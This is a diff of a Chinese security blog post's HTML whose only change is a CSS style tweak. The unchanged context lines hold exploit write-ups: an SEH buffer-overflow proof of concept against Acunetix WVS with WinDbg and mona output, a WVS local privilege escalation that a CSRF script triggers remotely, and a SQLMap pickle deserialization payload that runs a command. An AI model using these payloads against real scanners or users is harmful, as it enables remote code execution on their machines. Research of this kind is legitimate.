@@ -37,7 +37,7 @@
 <p>问题出在 WVS 扫描初始化阶段：WVS 在扫描初始化阶段会自动分析目标的首页并将其列出，如下图：</p>
 <p><img src="" alt="the image is lost"></p>
 <p>当外部域名长度大于 268 时，WVS 就会崩溃，编写 POC 如下：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://AAAA[300 A]AAAAA.com/1.jpg&#34;</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://AAAA[300 A]AAAAA.com/1.jpg&#34;</span>&gt;
 </span></span></code></pre></div><p>WinDbg 中跟一下发现崩溃发生于如下指令：</p>
 <pre tabindex="0"><code>00405944 8b4af8          mov     ecx,dword ptr [edx-8] ds:0023:41414139=????????
 </code></pre><p>edx 被 AAAA 覆盖，mona 生成定位字符串，可以看到 SEH 覆盖长度为 280，继续使用 mona 获取 p/p/r 地址：</p>
@@ -50,14 +50,14 @@
 0x74643371 : pop edi # pop esi # ret 0x08 | asciiprint,ascii,alphanum,lowernum {PAGE_EXECUTE_READ} [msls31.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v3.10.349.0 (C:\WINDOWS\system32\msls31.dll)			// 可用的 p/p/r
 ... snip ...
 </code></pre><p>NEXT SEH 也应该覆盖成 alphanum 字符，这里可以观察到 CF 位为 0，故而使用 JNB 做小跳 JNB 50 =&gt; <code>\x73\x50</code>，不足 4 位添加 AA 补全。最终构造 POC 如下：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsPAAq3dtAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.com/1.jpg&#34;</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsPAAq3dtAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.com/1.jpg&#34;</span>&gt;
 </span></span></code></pre></div><p>可以看到成功跳到 shellcode（BBBB）中：</p>
 <p><img src="" alt="the image is lost"></p>
 <h2 id="acunetix-wvs-10---local-privilege-escalation">Acunetix WVS 10 - Local Privilege escalation</h2>
 <p>WVS 9 以后的版本会安装名为 AcuWVSSchedulerv10 的自启动服务，监听本地8183 端口，用户可以通过它来为 AWVS 添加新的扫描任务。此接口实际上是调用 wvs_console.exe 来执行扫描任务的，并且下发任务时参数是通过拼接字符串实现的。而 wvs_console.exe 提供了 /Run 参数用来在爬行的过程中执行用户自定义的命令。由此两点直接导致了 WVS 的命令执行漏洞：</p>
 <p><img src="" alt="the image is lost"></p>
 <p>POC 如下：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">========================================================================
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Acunetix WVS 10 - from guest to Sytem (Local privilege escalation)
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
@@ -220,7 +220,7 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">============================================================================
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
 </span></span></code></pre></div><p>而此漏洞可以通过 CSRF 来触发，即：黑客通过 WVS 扫描你网站时通过页面中的 CSRF 自动发 POC，这使其由本地权限提升扩展成了远程代码执行：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">time</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Date()
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">y</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">getFullYear</span>();
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">m</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">getMonth</span>()<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>;
@@ -245,7 +245,7 @@
 </span></span></code></pre></div><p>本机 Win 10 测试，日志中可以发现命令确实被执行了，但是不知道什么原因没有看到想要的效果 🙁</p>
 <h2 id="sqlmap-反序列化代码执行">SQLMap 反序列化代码执行</h2>
 <p>序列化/反序列化使用不当很容易出现问题，这在各种语言中都有体现（PHP/Java/Python&hellip;）,而且导致的漏洞通常也会很严重，比如：代码执行。以 Python 为例，序列化/反序列化需要用到 pickle 模块，代码如下：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span>(object):
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">halo</span>(self):
@@ -274,7 +274,7 @@
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># &lt;__main__.A object at 0x0000000002AC7C50&gt; &lt;bound method A.halo of &lt;__main__.A object at 0x0000000002AC7C50&gt;&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># halo world</span>
 </span></span></code></pre></div><p>可以看到 <code>halo</code> 函数成功执行。Python 对象有一个 <code>__reduce__</code> 方法可以在反序列化时自动执行，由此可以造成代码执行漏洞：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span>(object):
@@ -290,7 +290,7 @@
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># $ uid=197609(Chu) gid=197121(None) 组=197121(None),559(Performance Log Users),545(Users),4(INTERACTIVE),66049(CONSOLE LO GON),11(Authenticated Users),15(This Organization),113(本地帐户),66048(LOCAL),262154(NTLM Authentication),401408(Medium</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Mandatory Level)</span>
 </span></span></code></pre></div><p>SQLMap 项目中 /lib/core/convert.py 函数 <code>base64unpickle</code> 定义如下：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">base64unpickle</span>(value):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">base64unpickle</span>(value):
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Decodes value from Base64 to plain format and deserializes (with pickle) its content
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
@@ -307,10 +307,10 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> retVal
 </span></span></code></pre></div><p>恶意数据 -&gt; cmdLineParser@/lib/parse/cmdline.py -&gt; _mergeOptions@/lib/core/option.py -&gt; base64unpickle@/lib/core/convert.py -&gt; pickle.loads 导致代码执行，POC 如下：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python sqlmap.py --pickled-options gAJjc3VicHJvY2VzcwpQb3BlbgpxAFUIY2FsYy5leGVxAYVxAoVxA1JxBC4<span style="color:#f92672">=</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python sqlmap.py --pickled-options gAJjc3VicHJvY2VzcwpQb3BlbgpxAFUIY2FsYy5leGVxAYVxAoVxA1JxBC4<span style="color:#f92672">=</span>
 </span></span></code></pre></div><p><img src="" alt="the image is lost"></p>
 <p>漏洞被爆出后 SQLMap 团队以白名单方式进行了修复：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Chu@DESKTOP-PBKB22I /cygdrive/f/Pentest
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Chu@DESKTOP-PBKB22I /cygdrive/f/Pentest
 </span></span><span style="display:flex;"><span>$ diff sqlmap/lib/core/convert.py sqlmap.bak/lib/core/convert.py
 </span></span><span style="display:flex;"><span>11d10
 </span></span><span style="display:flex;"><span>&lt; import StringIO
